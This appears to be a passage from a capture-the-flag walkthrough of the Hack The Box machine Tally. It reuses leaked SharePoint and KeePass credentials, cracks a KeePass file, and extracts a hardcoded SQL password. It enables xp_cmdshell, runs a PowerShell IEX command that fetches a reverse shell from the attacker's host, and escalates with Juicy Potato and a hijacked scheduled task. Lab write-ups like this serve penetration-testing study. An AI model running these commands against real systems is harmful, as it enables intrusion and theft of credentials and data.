200)<br/>/_vti_bin/sharepointemailws.asmx (Status: 200)<br/>/_vti_bin/sitesdisco.aspx (Status: 200)<br/>/_vti_bin/siteswsdl.aspx (Status: 200)<br/>/_vti_bin/owssvr.dll (Status: 401)<br/>/_vti_bin/expurlwp.aspx (Status: 302)<br/>/_layouts/wrkmng.aspx (Status: 401)<br/>/_vti_bin/spsearch.asmx (Status: 200)<br/>/_vti_bin/usergroup.asmx (Status: 200)<br/>/_vti_bin/spdisco.aspx (Status: 200)<br/>/_vti_bin/versions.asmx (Status: 200)<br/>/_vti_bin/usergroupdisco.aspx (Status: 200)<br/>/_vti_bin/versionswsdl.aspx (Status: 200)<br/>/_vti_bin/viewsdisco.aspx (Status: 200)<br/>/_vti_bin/versionsdisco.aspx (Status: 200)<br/>/_vti_bin/views.asmx (Status: 200)<br/>/_vti_bin/usergroupwsdl.aspx (Status: 200)<br/>/_vti_bin/viewswsdl.aspx (Status: 200)<br/>/_vti_bin/webs.asmx (Status: 200)<br/>/_vti_bin/websdisco.aspx (Status: 200)<br/>/_vti_bin/webswsdl.aspx (Status: 200)<br/>/_vti_bin/webpartpageswsdl.aspx (Status: 200)<br/>/_vti_bin/webpartpages.asmx (Status: 200)<br/>/_vti_bin/webpartpagesdisco.aspx (Status: 200)<br/>/_wpresources (Status: 301)<br/>/_vti_pvt (Status: 301)<br/>/_vti_inf.html (Status: 200)<br/>/alerts.asmx (Status: 200)<br/>/app_browsers (Status: 301)<br/>/app_globalresources (Status: 301)<br/>/areaservice.asmx (Status: 200)<br/>/aspnet_client (Status: 301)<br/>/bin (Status: 301)<br/>/default.aspx (Status: 200)<br/>/docs/_layouts/viewlsts.aspx (Status: 302)<br/>/dspsts.asmx (Status: 200)<br/>/dws.asmx (Status: 200)<br/>/forms.asmx (Status: 200)<br/>/imaging.asmx (Status: 200)<br/>/lists.asmx (Status: 200)<br/>/meetings.asmx (Status: 200)<br/>/mysite/_layouts/mysite.aspx (Status: 200)<br/>/news/_layouts/viewlsts.aspx (Status: 302)<br/>/outlookadapter.asmx (Status: 200)<br/>/permissions.asmx (Status: 200)<br/>/search.asmx (Status: 200)<br/>/searchcenter/_layouts/viewlsts.aspx (Status: 302)<br/>/sitedata.asmx (Status: 200)<br/>/sitedirectory/_layouts/viewlsts.aspx (Status: 302)<br/>/shared documents/forms/allitems.aspx (Status: 200)<br/>/sites.asmx (Status: 200)<br/>/spscrawl.asmx (Status: 200)<br/>/userprofileservice.asmx (Status: 200)<br/>/usergroup.asmx (Status: 200)<br/>/versions.asmx (Status: 200)<br/>/views.asmx (Status: 200)<br/>/webpartpages.asmx (Status: 200)<br/>/webs.asmx (Status: 200)<br/>/wpresources (Status: 301)<br/></div></div></div>
<div class="page" id="viewlists.aspx"><h1><b><u>viewlists.aspx</u></b></h1><img alt="images/1703-1.png" src="images/1703-1.png"/><br/><img alt="images/1703-2.png" src="images/1703-2.png"/><br/><br/><span style="color:#24ff00;">To view these </span><span style="color:#ffff00;">documents</span><span style="color:#24ff00;">, download libreoffice if you don't already have it installed with</span><br/><img alt="images/1703-3.png" src="images/1703-3.png"/><br/><br/></div>
<div class="page" id="/Documents"><h1><b><u>/Documents</u></b></h1><img alt="images/1704-1.png" src="images/1704-1.png"/><br/><br/><span style="color:#24ff00;">lets view the contents of this word document with</span><br/><span style="color:#ffa500;">libreoffice ftp-details.docx</span><br/><img alt="images/1704-2.png" src="images/1704-2.png"/><br/><img alt="images/1704-3.png" src="images/1704-3.png"/><br/><img alt="images/1704-4.png" src="images/1704-4.png"/><br/><span style="color:#24ff00;">password:</span><span style="color:#ffff00;">UTDRSCH53c"$6hys</span></div>
<div class="page" id="Site Pages"><h1><b><u>Site Pages</u></b></h1><img alt="images/1705-1.png" src="images/1705-1.png"/><br/><br/><span style="color:#24ff00;">No need for </span><span style="color:#ffa500;">libreoffice</span><span style="color:#24ff00;"> since clicking this link redirects us to the doc within our webbrowser. </span><br/><img alt="images/1705-2.png" src="images/1705-2.png"/></div>
<div class="page" id="ftp"><h1><b><u>ftp</u></b></h1><span style="color:#24ff00;">we can use our creds from the sharepoint documents to authenticate as ftp_user:</span><span style="color:#ffff00;">UTDRSCH53c"$6hys</span> <span style="color:#24ff00;">and recursively download all of the ftp servers contents with</span><br/><br/><span style="color:#ffa500;">wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@10.10.10.59'</span><br/><img alt="images/1711-1.png" src="images/1711-1.png"/><br/><br/><span style="color:#24ff00;">doing so creates a directory for us we can enumerate:</span><br/><img alt="images/1711-2.png" src="images/1711-2.png"/></div>
<div class="page" id="find . -type f"><h1><b><u>find . -type f</u></b></h1><span style="color:#24ff00;">lets run a </span><span style="color:#ffa500;">find</span><span style="color:#24ff00;"> command and look for files stored within the ftp server that may be interesting</span><br/><br/><span style="color:#ffa500;">find . -type f</span><br/><span style="color:#24ff00;">where</span><br/><span style="color:#ffa500;">.</span><span style="color:#24ff00;"> runs </span><span style="color:#ffa500;">find</span><span style="color:#24ff00;"> on our current directory and<br/></span><span style="color:#ffa500;">-type f </span><span style="color:#24ff00;">specifies </span><span style="color:#ffa500;">find</span><span style="color:#24ff00;"> will return only files</span><br/><img alt="images/1709-1.png" src="images/1709-1.png"/><br/><br/><br/><img alt="images/1709-2.png" src="images/1709-2.png"/><br/><span style="color:#24ff00;">we see there are a number of </span><span style="color:#ffff00;">keepass database</span><span style="color:#24ff00;"> files that may contain sensitive information on our target, lets see if we can use </span><span style="color:#ffa500;">kpcli</span><span style="color:#24ff00;"> without a password to view it</span><br/><br/><span style="color:#ffa500;">kpcli -kdb ./Tim/Files/tim.kdbx</span><br/><img alt="images/1709-3.png" src="images/1709-3.png"/><br/><br/><span style="color:#24ff00;">its password protected, which means we need to crack its password in order to view its contents, luckily </span><span style="color:#ffa500;">jumbojohn</span><span style="color:#24ff00;"> has just the tools we need</span></div>
<div class="page" id="keepass"><h1><b><u>keepass</u></b></h1><span style="color:#24ff00;">because we're cracking a keepass password and we need to supply john with a password hash format it can crack, we'll first use </span><span style="color:#ffa500;">keepass2john</span><span style="color:#24ff00;"> to generate a </span><span style="color:#ffff00;">password hash</span><span style="color:#24ff00;"> and then run it against a password list (</span><span style="color:#ffa500;">rockyou.txt</span><span style="color:#24ff00;">) in john itself</span><br/><br/><span style="color:#ffa500;">keepass2john ./Tim/Files/tim.kdbx &gt; tim_kdbx_hash</span><br/><img alt="images/1708-1.png" src="images/1708-1.png"/><br/><br/><span style="color:#ffa500;">john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt</span><br/><img alt="images/1708-2.png" src="images/1708-2.png"/><br/><br/><span style="color:#24ff00;">our password is </span><span style="color:#ffff00;">simplementeyo</span><span style="color:#24ff00;">!</span><br/><img alt="images/1708-3.png" src="images/1708-3.png"/></div>
<div class="page" id="kpcli -kdb tim.kdbx"><h1><b><u>kpcli -kdb tim.kdbx</u></b></h1><span style="color:#24ff00;">now that we have our creds password:</span><span style="color:#ffff00;">simplementeyo</span><span style="color:#24ff00;">, we can view the contents of tim's keepass database with the program </span><span style="color:#ffa500;">kpcli</span><br/><br/><span style="color:#ffa500;">kpcli --kdb tim.kdbx</span><br/><img alt="images/1710-1.png" src="images/1710-1.png"/><br/><br/><br/>Creds<br/><span style="color:#ffff00;">Acc0unting</span><br/><img alt="images/1710-2.png" src="images/1710-2.png"/><br/><img alt="images/1710-3.png" src="images/1710-3.png"/><br/><br/><img alt="images/1710-4.png" src="images/1710-4.png"/></div>
<div class="page" id="smb"><h1><b><u>smb</u></b></h1><span style="color:#ffff00;">2 ways to read TALLY's Finance smb share</span><br/><br/>1)<span style="color:#24ff00;">mounting the smb account share with mount<br/><br/></span><span style="color:#191905;">2)</span><span style="color:#24ff00;">connecting to the smb share with smbclient</span></div>
<div class="page" id="mounting smb account share"><h1><b><u>mounting smb account share</u></b></h1><span style="color:#24ff00;">step 1: make an smb directory in our attack machine's /mnt folder</span><br/><img alt="images/1712-1.png" src="images/1712-1.png"/><br/><br/><span style="color:#24ff00;">Mount example:</span><br/><span style="color:#ffa500;">sudo mount -t cifs -o "domain=MYDOMAIN,username=MyUserName,password=myPas$werd,sec=ntlm" //&lt;your windows host ip&gt;/&lt;your remote share name&gt; /mnt/my_mount_dir</span><br/><br/><br/><br/><strong><span style="color:#ffa500;">mount -t cifs -o username=Finance //10.10.10.59/ACCT /mnt/smb</span></strong><br/><span style="color:#24ff00;">our leaked password was </span><span style="color:#ffff00;">Acc0unting</span><br/><img alt="images/1712-2.png" src="images/1712-2.png"/><br/><br/><span style="color:#24ff00;">rummaging through the file share, there is a directory named </span><span style="color:#ffa500;">New Folder</span><span style="color:#24ff00;"> within the</span><span style="color:#ffa500;"> zz_Migration</span><span style="color:#24ff00;"> folder</span> <span style="color:#24ff00;">which is suspicious as to why it was never named anything specific</span><br/><img alt="images/1712-3.png" src="images/1712-3.png"/><br/><br/><span style="color:#ffa500;">tester.exe</span><span style="color:#24ff00;"> is the oldest and most peculular looking </span><span style="color:#ffa500;">.exe </span><span style="color:#24ff00;">in the directory, it was hardcoded by the devs and is not a commercial off the shelf executable so lets check it to see if it has any credentials hard coded:</span><br/><br/><span style="color:#ffa500;">strings tester.exe | grep PWD</span><br/><img alt="images/1712-4.png" src="images/1712-4.png"/><br/><br/><span style="color:#24ff00;">there is an SQL Server with user info and a password hardcoded into the .exe</span>!<br/><span style="color:#ffff00;">DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;</span><br/></div>
<div class="page" id="connecting to the smb share with smbclient"><h1><b><u>connecting to the smb share with smbclient</u></b></h1><span style="color:#ffa500;">smbclient //10.10.10.59/ACCT -U Finance</span><br/><span style="color:#24ff00;">recall the share password </span><span style="color:#ffff00;">Acc0unting</span><br/><img alt="images/1723-1.png" src="images/1723-1.png"/><br/><img alt="images/1723-2.png" src="images/1723-2.png"/></div>
<div class="page" id="zz_Archived (dead end)"><h1><b><u>zz_Archived (dead end)</u></b></h1><img alt="images/1724-1.png" src="images/1724-1.png"/><br/><br/><span style="color:#24ff00;">old server creds will </span><span style="color:#ff0000;">NOT</span><span style="color:#24ff00;"> connect us to the database, looking at the strings of </span><span style="color:#ffa500;">tester.exe</span><span style="color:#24ff00;"> will</span><br/><img alt="images/1724-2.png" src="images/1724-2.png"/></div>
<div class="page" id="zz_Migration/Binaries/New Folder/tester.exe"><h1><b><u>zz_Migration/Binaries/New Folder/tester.exe</u></b></h1><img alt="images/1728-1.png" src="images/1728-1.png"/><br/><br/><span style="color:#24ff00;">running strings on </span><span style="color:#ffa500;">tester.exe </span><span style="color:#24ff00;">will also list the database creds in its output</span><br/><span style="color:#ffa500;">strings tester.exe</span><br/><img alt="images/1728-2.png" src="images/1728-2.png"/><br/><img alt="images/1728-3.png" src="images/1728-3.png"/><br/><br/><br/><br/><span style="color:#ffff00;">DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;</span><br/><img alt="images/1728-4.png" src="images/1728-4.png"/></div>
<div class="page" id="sqsh interactive database shell"><h1><b><u>sqsh interactive database shell</u></b></h1><img alt="images/1713-1.png" src="images/1713-1.png"/><br/><span style="color:#24ff00;">We'll be able to preform</span><span style="color:#ffff00;"> remote code execution</span><span style="color:#24ff00;"> on the SQL server we found by connecting to it via </span><span style="color:#ffa500;">sqsh</span><span style="color:#24ff00;"> and issuing commands within it</span><br/><br/><span style="color:#24ff00;">connect with </span><br/><span style="color:#ffa500;">sqsh -S 10.10.10.59 -U sa -P “GWE3V65#6KFH93@4GWTG2G”</span><br/><span style="color:#24ff00;">where </span><span style="color:#ffa500;">-S</span><span style="color:#24ff00;"> specifies </span><span style="color:#ffa500;">server</span><span style="color:#24ff00;"> <br/></span><span style="color:#ffa500;">-U</span><span style="color:#24ff00;"> specifies </span><span style="color:#ffa500;">user</span><span style="color:#24ff00;"> <br/></span><span style="color:#ffa500;">-P</span><span style="color:#24ff00;"> specifies </span><span style="color:#ffa500;">pass</span><br/><img alt="images/1713-2.png" src="images/1713-2.png"/></div>
<div class="page" id="xp_cmdshell does not exist"><h1><b><u>xp_cmdshell does not exist</u></b></h1><span style="color:#ffa500;">xp_cmdshell 'whoami;'<br/>go</span><br/><img alt="images/1714-1.png" src="images/1714-1.png"/><br/><br/><span style="color:#24ff00;">when we try to run ‘</span><span style="color:#ffa500;">whoami</span><span style="color:#24ff00;">’ we get a response from the server saying the </span><span style="color:#ffa500;">xp_cmdshell </span><span style="color:#24ff00;">component is turned off, so we'll have to change the settings which enable </span><span style="color:#ffa500;">xp_cmdshell </span><span style="color:#24ff00;">to execute</span><br/></div>
<div class="page" id="reconfigure"><h1><b><u>reconfigure</u></b></h1><span style="color:#24ff00;">to do this, we'll need to use the </span><span style="color:#ffa500;">EXEC SP_CONFIGURE </span><span style="color:#24ff00;">command</span><br/><br/><span style="color:#ffa500;">EXEC SP_CONFIGURE ‘xp_cmdshell’, 1</span><br/><img alt="images/1715-1.png" src="images/1715-1.png"/><br/><br/><span style="color:#24ff00;">we get a server response saying that either xp_cmdshell doesn't exist or it is an </span><span style="color:#ffff00;">advanced option</span><span style="color:#24ff00;"> feature,</span><br/><br/><span style="color:#ffa500;">EXEC SP_CONFIGURE 'show advanced options', 1<br/>EXEC SP_CONFIGURE ‘xp_cmdshell’, 1<br/>reconfigure<br/>go</span><br/><br/><img alt="images/1715-2.png" src="images/1715-2.png"/><br/><br/><span style="color:#24ff00;">now we can toggle the database to use </span><span style="color:#ffa500;">xp_cmdshell</span><span style="color:#24ff00;"> to run commands</span><br/><img alt="images/1715-3.png" src="images/1715-3.png"/></div>
<div class="page" id="xp_cmdshell 'whoami'"><h1><b><u>xp_cmdshell 'whoami'</u></b></h1><span style="color:#24ff00;">the </span><span style="color:#ffa500;">sqsh shell</span><span style="color:#24ff00;"> is stubborn to put it lightly, so you have to be thorough with each statement you input, you see I tried to cut corners enabling </span><span style="color:#ffa500;">advanced options </span><span style="color:#24ff00;">and </span><span style="color:#ffa500;">xp_cmdshell </span><span style="color:#24ff00;">simultaneously but ran into errors, <br/>its easier to do each EXEC statement one at a time, but don't be surprised when the settings </span><span style="color:#ff0000;">revert</span><span style="color:#24ff00;"> after a short period of time</span><br/><br/><span style="color:#ffa500;"><div class = "codebox"><div style="background-color: #001b33; padding: 10px; border: 1px solid green;">EXEC SP_CONFIGURE 'show advanced options', 1<br/>reconfigure<br/>go <br/><br/>reconfigure<br/>go <br/><br/>EXEC SP_CONFIGURE 'xp_cmdshell', 1<br/>reconfigure<br/>go<br/><br/>reconfigure<br/>go <br/><br/>xp_cmdshell 'whoami'<br/>go</div></div></span><br/><img alt="images/1716-1.png" src="images/1716-1.png"/><br/><br/><img alt="images/1716-2.png" src="images/1716-2.png"/><br/><span style="color:#24ff00;">the sql database runs as user </span><span style="color:#ffff00;">sarah</span><br/></div>
<div class="page" id="powershell IEX revshell"><h1><b><u>powershell IEX revshell</u></b></h1><span style="color:#24ff00;">now that we have proof that </span><span style="color:#ffff00;">code execution</span><span style="color:#24ff00;"> works on this machine and know our victim is a </span><span style="color:#ffff00;">windows machine</span><span style="color:#24ff00;">, we'll have tally's sql server download and execute a </span><a href="https://github.com/samratashok/nishang">nishang powershell</a><span style="color:#24ff00;"> </span><img alt="images/1727-1.png" src="images/1727-1.png"/> that will call a reverse shell back to our attack machine<br/><br/><span style="color:#24ff00;">First, move a </span><span style="color:#ffa500;">nishang reverse shell</span><span style="color:#24ff00;">  to our working directory (don't forget to add the reverse shell call at the bottom of the script)</span><br/><span style="color:#ffa500;">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.62 -Port 9001</span><br/><img alt="images/1727-2.png" src="images/1727-2.png"/><br/><br/><span style="color:#24ff00;">and spin up an http server</span><br/><img alt="images/1727-3.png" src="images/1727-3.png"/><br/><br/><span style="color:#24ff00;">now go back to </span><span style="color:#ffa500;">sqsh</span><span style="color:#24ff00;">, renable the </span><span style="color:#ffa500;">advanced options</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">cmdshell</span><span style="color:#24ff00;">, and download our file with a </span><span style="color:#ffa500;">powershell's IEX command</span><br/><img alt="images/1727-4.png" src="images/1727-4.png"/><br/><br/><span style="color:#ffa500;">xp_cmdshell "powershell.exe IEX(new-object net.webclient).downloadstring('http://10.10.14.62/rev.ps1')"</span><br/><img alt="images/1727-5.png" src="images/1727-5.png"/><br/><br/><span style="color:#24ff00;">set up a listener on the designated port our reverse shell is coded to connect to and </span><br/><span style="color:#24ff00;"> we have our </span><span style="color:#ffff00;">foothold</span><span style="color:#24ff00;">!</span><br/><img alt="images/1727-6.png" src="images/1727-6.png"/></div>
<div class="page" id="privesc w/ juicy potato"><h1><b><u>privesc w/ juicy potato</u></b></h1><span style="color:#24ff00;">For windows machine priv esc, it is always a good idea to see what kind of privileges our owned user has, it may narrow down easy to use priv-esc exploits right on the spot without needing to run a hardy enumeration script like </span><span style="color:#ffa500;">winPEAS</span><br/><br/><span style="color:#ffa500;">whoami /priv</span><br/><img alt="images/1718-1.png" src="images/1718-1.png"/><br/><span style="color:#ffff00;">SeImpersonatePrivilege</span><span style="color:#24ff00;"> is Enabled!</span> <br/><br/><span style="color:#24ff00;">Which means this box is most likely vulnerable to the very common and very effective</span><span style="color:#ffa500;"> juicy potato</span><span style="color:#24ff00;"> exploit</span></div>
<div class="page" id="juicy potato"><h1><b><u>juicy potato</u></b></h1><span style="color:#24ff00;">A quick rundown on</span><span style="color:#ffa500;"> juicy potato</span><span style="color:#24ff00;"> is that you need a batch script that will download a </span><span style="color:#ffa500;">nishang powershell </span><span style="color:#24ff00;">calling back to our machine on a different port number </span><img alt="images/1720-1.png" src="images/1720-1.png"/> and run it along with the juicy potato exploit itself<br/><br/><span style="color:#24ff00;">batch script calling back to our nishang rev shell is </span><span style="color:#ffa500;">shell.bat</span>, <span style="color:#24ff00;">which we can write locally</span><br/><img alt="images/1720-2.png" src="images/1720-2.png"/><br/><span style="color:#24ff00;">our juicy potato executable is</span> <span style="color:#ffa500;">jp.exe</span> <a href="https://github.com/ohpe/juicy-potato/releases">download it here</a><br/><br/><br/><br/><span style="color:#24ff00;">Next lets download </span><span style="color:#ffa500;">juicy potato </span><span style="color:#24ff00;">and a simple </span><span style="color:#ffa500;">batch script </span><span style="color:#24ff00;">file to sarah's Download directory using powershell's </span><span style="color:#ffa500;">downloadfile</span><span style="color:#24ff00;"> command</span> (make sure our http server is still up as well)<br/><br/><span style="color:#ffa500;">powershell.exe (new-object net.webclient).downloadfile('http://10.10.14.62/shell.bat', 'C:\Users\Sarah\Downloads\shell.bat')</span><br/><img alt="images/1720-3.png" src="images/1720-3.png"/><br/><span style="color:#ffa500;">powershell.exe (new-object net.webclient).downloadfile('http://10.10.14.62/jp.exe', 'C:\Users\Sarah\Downloads\jp.exe')</span><br/><img alt="images/1720-4.png" src="images/1720-4.png"/><br/><br/><span style="color:#24ff00;">verify our downloads were written to Sarah's Downloads directory </span><br/><img alt="images/1720-5.png" src="images/1720-5.png"/><br/><br/><span style="color:#24ff00;">now we're ready to run </span><span style="color:#ffa500;">juicy potato </span><span style="color:#24ff00;">from our victim</span><br/><span style="color:#ffa500;">./jp.exe -t * -p shell.bat -l 9001</span><br/><img alt="images/1720-6.png" src="images/1720-6.png"/><br/><span style="color:#24ff00;">exploit runs fine with default </span><span style="color:#ffa500;">CLSID</span><br/><br/><br/><span style="color:#24ff00;">and we're </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">!</span><br/><img alt="images/1720-7.png" src="images/1720-7.png"/><br/></div>
<div class="page" id="priv esc w/ scheduled task"><h1><b><u>priv esc w/ scheduled task</u></b></h1><span style="color:#24ff00;">The intended priv esc route is right on </span><span style="color:#ffff00;">Sarah's</span><span style="color:#24ff00;"> Desktop</span><br/><img alt="images/1721-1.png" src="images/1721-1.png"/><br/><br/><br/><br/></div>
<div class="page" id="SPBestWarmUp.ps1"><h1><b><u>SPBestWarmUp.ps1</u></b></h1><img alt="images/1722-1.png" src="images/1722-1.png"/><br/><img alt="images/1722-2.png" src="images/1722-2.png"/><img alt="images/1722-3.png" src="images/1722-3.png"/><br/><img alt="images/1722-4.png" src="images/1722-4.png"/><br/><br/><span style="color:#24ff00;">according to the calendar trigger in </span><span style="color:#ffa500;">SPBestWarmUp.xml</span><span style="color:#24ff00;">, every hour </span><img alt="images/1722-5.png" src="images/1722-5.png"/> the administrator <img alt="images/1722-6.png" src="images/1722-6.png"/> runs <span style="color:#ffa500;">SPBestWarmUp.ps1</span> <img alt="images/1722-7.png" src="images/1722-7.png"/><br/><br/><span style="color:#24ff00;">since we have permission to </span><span style="color:#ffff00;">write</span><span style="color:#24ff00;"> to sarah's desktop folder, we can </span><span style="color:#ffff00;">rewrite</span><span style="color:#24ff00;"> </span><span style="color:#ffa500;">SPBestWarmUp.ps1</span><span style="color:#24ff00;"> to download and execute our reverse shell and run it as root</span><br/><img alt="images/1722-8.png" src="images/1722-8.png"/><br/><img alt="images/1722-9.png" src="images/1722-9.png"/></div>
<div class="page" id="reverse shell"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">wait until the scheduled tasks runs and we're </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">!</span><br/><img alt="images/1725-1.png" src="images/1725-1.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/1719-1.png" src="images/1719-1.png"/><span style="color:#ffff00;"><br/>be72362e8dffeca2b42406d5d1c74bb1<br/><br/></span><img alt="images/1719-2.png" src="images/1719-2.png"/><br/>608bb707348105911c8991108e523eda<br/></div>
<div class="page" id="Lessons Learned"><h1><b><u>Lessons Learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1717-1.png" src="images/1717-1.png"/></div>
